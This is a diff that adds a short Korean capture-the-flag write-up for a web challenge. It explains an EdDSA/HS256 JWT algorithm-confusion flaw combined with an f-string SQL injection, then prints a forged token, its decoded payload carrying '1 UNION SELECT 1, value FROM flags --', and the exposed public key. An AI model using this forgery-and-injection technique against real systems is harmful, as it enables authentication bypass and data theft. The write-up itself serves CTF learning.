@@ -1,0 +1,21 @@
+취약점
+1. app.py에 서버가 구동 될때 ed25519키쌍을 만들고 공개키를 그대로 app/static/ed25519_public.pub에 저장함
+2. verify_and_decode_eddsa 함수에서 다른 알고리즘으로 만든 키도 허용시키는 취약점이 있음
+3./profile에서 노트 목록을 읽을 때 cur.execute(f"SELECT ... WHERE owner_id = {uid} ...")처럼 uid를 그대로 문자열 보관함
+그래서 토큰에 uid = "1 UNION SELECT 1, value FROM flags --"처럼 넣으면 실제 SQL이 합쳐져 flags 테이블의 value가 결과로 나옴
+익스과정
+1. GET /static/ed25519_public.pub 로 공개키를 내려받음
+2. 헤더를 {"alg":"HS256"}으로 두고, 페이로드의 uid에 
+SQL 인젝션 문자열(1 UNION SELECT 1, value FROM flags --)을 담은 JWT를 작성
+3. HS256 서명을 방금 내려받은 공개키로 계산해 토큰을 완성
+4. 완성된 토큰을 헤더쿠키에 넣고 /profile에 접속
+
+ex code -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIxIFVOSU9OIFNFTEVDVCAxLCB2YWx1ZSBGUk9NIGZsYWdzIC0tIiwidW5hbWUiOiJwd25kIiwiaWF0IjoxNzYyODU4NDgxLCJleHAiOjE3NjI4NjIwODF9.bep8xATRlwBazyu2rSlu27btazQ7jtuEP7l7WtV0uLg
+{"alg":"HS256","typ":"JWT"}
+{
+  "uid": "1 UNION SELECT 1, value FROM flags --",
+  "uname": "pwnd",
+  "iat": 1762858481,
+  "exp": 1762862081
+}
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJYHP7Zx5hnpIRdIrtzdq6md/jUgNMfpQclUBhBTepSj
